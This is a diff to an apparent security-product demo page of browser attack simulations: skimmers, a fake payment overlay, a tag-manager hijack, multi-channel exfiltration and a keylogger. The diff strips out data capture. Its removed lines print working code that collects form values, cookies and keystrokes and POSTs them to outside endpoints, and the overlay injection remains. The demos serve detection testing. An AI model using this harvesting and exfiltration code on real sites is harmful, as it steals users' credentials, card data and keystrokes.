@@ -43,21 +43,24 @@ export const loginSkimmer = `// CSD Demo — Login Credential Skimmer
 
     // Read existing form fields (CSD detects field reads on page-load DOM fields)
     var inputs = document.querySelectorAll('input');
-    var creds = {};
+    var populatedFieldCount = 0;
     inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        creds[name] = input.value || '(empty)';
+        if (input.value) populatedFieldCount++;
     });
-    console.log('[CSD Demo][Formjack] Harvested credentials:', creds);
+    console.log('[CSD Demo][Formjack] Observed ' + inputs.length + ' fields; values discarded');
 
-    // Exfiltrate via fetch
-    var payload = JSON.stringify({ type: 'login_harvest', data: creds, timestamp: Date.now() });
+    // Send only synthetic counters; form contents never leave the browser
+    var payload = JSON.stringify({
+        type: 'login_harvest', field_count: inputs.length,
+        populated_field_count: populatedFieldCount,
+        field_values_discarded: true, timestamp: Date.now()
+    });
     fetch('https://www.httpbin.org/post', {
         method: 'POST',
         mode: 'no-cors',
         body: payload
     }).then(function() {
-        console.log('[CSD Demo][Formjack] Credentials exfiltrated to www.httpbin.org');
+        console.log('[CSD Demo][Formjack] Synthetic network signal sent to www.httpbin.org');
     });
 
     console.log('[CSD Demo][Formjack] Simulation complete.');
@@ -80,21 +83,24 @@ export const regHarvester = `// CSD Demo — Registration Page Harvester
     console.log('[CSD Demo][Formjack] Starting registration harvester...');
 
     var inputs = document.querySelectorAll('input, select');
-    var data = {};
+    var populatedFieldCount = 0;
     inputs.forEach(function(el) {
-        var name = el.name || el.id || el.type || el.tagName;
-        data[name] = el.value || '(empty)';
+        if (el.value) populatedFieldCount++;
     });
-    console.log('[CSD Demo][Formjack] Registration data harvested:', data);
+    console.log('[CSD Demo][Formjack] Observed ' + inputs.length + ' fields; values discarded');
 
-    var payload = JSON.stringify({ type: 'registration_harvest', data: data, timestamp: Date.now() });
+    var payload = JSON.stringify({
+        type: 'registration_harvest', field_count: inputs.length,
+        populated_field_count: populatedFieldCount,
+        field_values_discarded: true, timestamp: Date.now()
+    });
     fetch('https://jsonplaceholder.typicode.com/posts', {
         method: 'POST',
         mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' },
         body: payload
     }).then(function() {
-        console.log('[CSD Demo][Formjack] Registration data exfiltrated to jsonplaceholder.typicode.com');
+        console.log('[CSD Demo][Formjack] Synthetic network signal sent to jsonplaceholder.typicode.com');
     });
 
     console.log('[CSD Demo][Formjack] Simulation complete.');
@@ -122,12 +128,11 @@ export const cardSkimmer = `// CSD Demo — Payment Card Skimmer (Overlay Techni
 
     // Step 1: Read existing form fields first
     var inputs = document.querySelectorAll('input');
-    var existing = {};
+    var populatedFieldCount = 0;
     inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        existing[name] = input.value || '(empty)';
+        if (input.value) populatedFieldCount++;
     });
-    console.log('[CSD Demo][Skim] Existing fields harvested:', existing);
+    console.log('[CSD Demo][Skim] Observed ' + inputs.length + ' fields; values discarded');
 
     // Step 2: Inject a fake overlay form (CSD detects the script injection)
     var overlay = document.createElement('div');
@@ -143,14 +148,18 @@ export const cardSkimmer = `// CSD Demo — Payment Card Skimmer (Overlay Techni
     document.body.appendChild(overlay);
     console.log('[CSD Demo][Skim] Fake payment overlay injected into DOM');
 
-    // Step 3: Exfiltrate captured data
-    var payload = JSON.stringify({ type: 'card_skim', captured: existing, timestamp: Date.now() });
+    // Step 3: Send a synthetic network signal without captured data
+    var payload = JSON.stringify({
+        type: 'card_skim', field_count: inputs.length,
+        populated_field_count: populatedFieldCount,
+        field_values_discarded: true, timestamp: Date.now()
+    });
     fetch('https://www.httpbin.org/post', {
         method: 'POST',
         mode: 'no-cors',
         body: payload
     }).then(function() {
-        console.log('[CSD Demo][Skim] Skimmed data exfiltrated to www.httpbin.org');
+        console.log('[CSD Demo][Skim] Synthetic network signal sent to www.httpbin.org');
     });
 
     console.log('[CSD Demo][Skim] Simulation complete. Click "Verify" on the overlay to dismiss it.');
@@ -264,12 +273,11 @@ export const tagManagerHijack = `// CSD Demo — Tag Manager Hijack
 
         // After loading, read form fields (simulating data collection by compromised tag)
         var inputs = document.querySelectorAll('input');
-        var collected = {};
+        var populatedFieldCount = 0;
         inputs.forEach(function(input) {
-            var name = input.name || input.id || input.type;
-            collected[name] = input.value || '(empty)';
+            if (input.value) populatedFieldCount++;
         });
-        console.log('[CSD Demo][Supply Chain] Compromised tag collected form data:', collected);
+        console.log('[CSD Demo][Supply Chain] Compromised tag observed ' + inputs.length + ' fields; values discarded');
     };
     fakeTag.onerror = function() {
         console.log('[CSD Demo][Supply Chain] Script load attempted (may be blocked)');
@@ -299,15 +307,18 @@ export const multiChannel = `// CSD Demo — Multi-Channel Exfiltration
 (function() {
     console.log('[CSD Demo][Exfil] Starting multi-channel exfiltration...');
 
-    // Harvest form fields
+    // Read form fields for detection, then discard their contents
     var inputs = document.querySelectorAll('input');
-    var data = {};
+    var populatedFieldCount = 0;
     inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        data[name] = input.value || '(empty)';
+        if (input.value) populatedFieldCount++;
     });
-    console.log('[CSD Demo][Exfil] Data harvested:', data);
-    var payload = JSON.stringify({ type: 'multi_channel', data: data, timestamp: Date.now() });
+    console.log('[CSD Demo][Exfil] Observed ' + inputs.length + ' fields; values discarded');
+    var payload = JSON.stringify({
+        type: 'multi_channel', field_count: inputs.length,
+        populated_field_count: populatedFieldCount,
+        field_values_discarded: true, timestamp: Date.now()
+    });
 
     // Channel 1: Fetch POST
     fetch('https://www.httpbin.org/post', {
@@ -355,14 +366,13 @@ export const highVolume = `// CSD Demo — High-Volume Domain Exfiltration
 (function() {
     console.log('[CSD Demo][Exfil] Starting high-volume exfiltration simulation...');
 
-    // Harvest form data
+    // Read form fields for detection, then discard their contents
     var inputs = document.querySelectorAll('input');
-    var data = {};
+    var populatedFieldCount = 0;
     inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        data[name] = input.value || '(empty)';
+        if (input.value) populatedFieldCount++;
     });
-    console.log('[CSD Demo][Exfil] Data harvested:', data);
+    console.log('[CSD Demo][Exfil] Observed ' + inputs.length + ' fields; values discarded');
 
     // Inject scripts from multiple CDN domains (these WILL appear in CSD Network view)
     var sources = [
@@ -387,7 +397,11 @@ export const highVolume = `// CSD Demo — High-Volume Domain Exfiltration
     });
 
     // Also send via fetch to safe endpoints
-    var payload = JSON.stringify({ type: 'high_volume', data: data, timestamp: Date.now() });
+    var payload = JSON.stringify({
+        type: 'high_volume', field_count: inputs.length,
+        populated_field_count: populatedFieldCount,
+        field_values_discarded: true, timestamp: Date.now()
+    });
     fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload });
     fetch('https://jsonplaceholder.typicode.com/posts', { method: 'POST', mode: 'no-cors', body: payload });
 
@@ -417,12 +431,11 @@ export const formOverlay = `// CSD Demo — Form Overlay Attack
 
     // Read the real form fields first
     var inputs = document.querySelectorAll('input');
-    var realData = {};
+    var populatedFieldCount = 0;
     inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        realData[name] = input.value || '(empty)';
+        if (input.value) populatedFieldCount++;
     });
-    console.log('[CSD Demo][DOM] Real form data captured:', realData);
+    console.log('[CSD Demo][DOM] Observed ' + inputs.length + ' fields; values discarded');
 
     // Find the form container and overlay it
     var form = document.querySelector('form') || document.querySelector('[class*="login"]') || document.querySelector('mat-card');
@@ -466,41 +479,40 @@ export const keylogger = `// CSD Demo — Keylogger Simulation
 (function() {
     console.log('[CSD Demo][DOM] Starting keylogger simulation...');
 
-    var keyBuffer = [];
+    var keystrokeCount = 0;
     var flushInterval = 5000;
 
-    // Attach keydown listener to capture keystrokes
-    document.addEventListener('keydown', function(e) {
-        keyBuffer.push({
-            key: e.key,
-            target: (e.target.name || e.target.id || e.target.tagName),
-            timestamp: Date.now()
-        });
-        if (keyBuffer.length >= 10) {
-            console.log('[CSD Demo][DOM] Keylogger buffer (last 10 keys):', JSON.parse(JSON.stringify(keyBuffer.slice(-10))));
+    // Count keydown events without retaining keys or target identity
+    document.addEventListener('keydown', function() {
+        keystrokeCount++;
+        if (keystrokeCount % 10 === 0) {
+            console.log('[CSD Demo][DOM] Keydown events observed:', keystrokeCount);
         }
     });
     console.log('[CSD Demo][DOM] Keydown listener attached to document');
 
-    // Also read current form field values
+    // Access form field values for detection, then discard them
     var inputs = document.querySelectorAll('input');
     inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        console.log('[CSD Demo][DOM] Monitoring field: ' + name + ' (current value: ' + (input.value || '(empty)') + ')');
+        void input.value;
     });
+    console.log('[CSD Demo][DOM] Monitoring ' + inputs.length + ' fields; values discarded');
 
     // Periodic flush simulation
     var flushCount = 0;
     var interval = setInterval(function() {
         flushCount++;
-        if (keyBuffer.length > 0) {
-            console.log('[CSD Demo][DOM] Keylogger flush #' + flushCount + ':', keyBuffer.length, 'keystrokes captured');
+        if (keystrokeCount > 0) {
+            console.log('[CSD Demo][DOM] Keylogger flush #' + flushCount + ':', keystrokeCount, 'events observed');
             fetch('https://www.httpbin.org/post', {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify({ type: 'keylog', keys: keyBuffer, timestamp: Date.now() })
+                body: JSON.stringify({
+                    type: 'keylog', keystroke_count: keystrokeCount,
+                    key_values_discarded: true, timestamp: Date.now()
+                })
             });
-            keyBuffer = [];
+            keystrokeCount = 0;
         }
         if (flushCount >= 6) {
             clearInterval(interval);
@@ -508,7 +520,7 @@ export const keylogger = `// CSD Demo — Keylogger Simulation
         }
     }, flushInterval);
 
-    console.log('[CSD Demo][DOM] Keylogger active for 30 seconds. Type in form fields to see captured output.');
+    console.log('[CSD Demo][DOM] Keylogger active for 30 seconds. Type in form fields to see event counts.');
 })();`;
 
 <Code code={keylogger} lang="js" title="Keylogger Simulation" />
@@ -538,12 +550,11 @@ export const maxDetection = `// CSD Demo — Maximum Detection (Combined Stress 
     // Phase 1: Form Field Harvesting
     console.log('\\n--- Phase 1: Form Field Harvesting ---');
     var inputs = document.querySelectorAll('input');
-    var harvested = {};
+    var populatedFieldCount = 0;
     inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        harvested[name] = input.value || '(empty)';
+        if (input.value) populatedFieldCount++;
     });
-    console.log('[CSD Demo][Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+    console.log('[CSD Demo][Formjack] Observed ' + inputs.length + ' fields; values discarded');
 
     // Phase 2: Multi-CDN Script Injection
     console.log('\\n--- Phase 2: Supply Chain — Multi-CDN Injection ---');
@@ -571,9 +582,9 @@ export const maxDetection = `// CSD Demo — Maximum Detection (Combined Stress 
     console.log('\\n--- Phase 3: Data Exfiltration ---');
     var payload = JSON.stringify({
         type: 'max_detection',
-        credentials: harvested,
-        page: window.location.href,
-        cookies: document.cookie,
+        field_count: inputs.length,
+        populated_field_count: populatedFieldCount,
+        field_values_discarded: true,
         timestamp: Date.now()
     });
 
@@ -606,7 +617,7 @@ export const maxDetection = `// CSD Demo — Maximum Detection (Combined Stress 
     var banner = document.createElement('div');
     banner.id = 'csd-demo-banner';
     banner.style.cssText = 'position:fixed;top:0;left:0;width:100%;padding:12px;background:#d32f2f;color:white;text-align:center;z-index:99999;font-family:sans-serif;font-size:14px;';
-    banner.innerHTML = 'CSD Demo: Attack simulation active — ' + cdns.length + ' scripts injected, ' + Object.keys(harvested).length + ' fields harvested ' +
+    banner.innerHTML = 'CSD Demo: Attack simulation active — ' + cdns.length + ' scripts injected, ' + inputs.length + ' fields observed ' +
         '<button onclick="document.getElementById(\\'csd-demo-banner\\').remove();" style="margin-left:15px;padding:4px 12px;background:white;color:#d32f2f;border:none;border-radius:3px;cursor:pointer;">Dismiss</button>';
     document.body.appendChild(banner);
     console.log('[CSD Demo][DOM] Attack status banner injected');
@@ -614,7 +625,7 @@ export const maxDetection = `// CSD Demo — Maximum Detection (Combined Stress 
     // Summary
     console.log('\\n' + '='.repeat(60));
     console.log('[CSD Demo] SIMULATION COMPLETE');
-    console.log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+    console.log('[CSD Demo] Fields observed: ' + inputs.length + ' (values discarded)');
     console.log('[CSD Demo] Scripts injected: ' + cdns.length + ' (from ' + cdns.length + ' CDN domains)');
     console.log('[CSD Demo] Exfil channels: 3 (2x fetch + 1x image beacon)');
     console.log('[CSD Demo] Detection takes 5-10 minutes to appear in CSD console.');
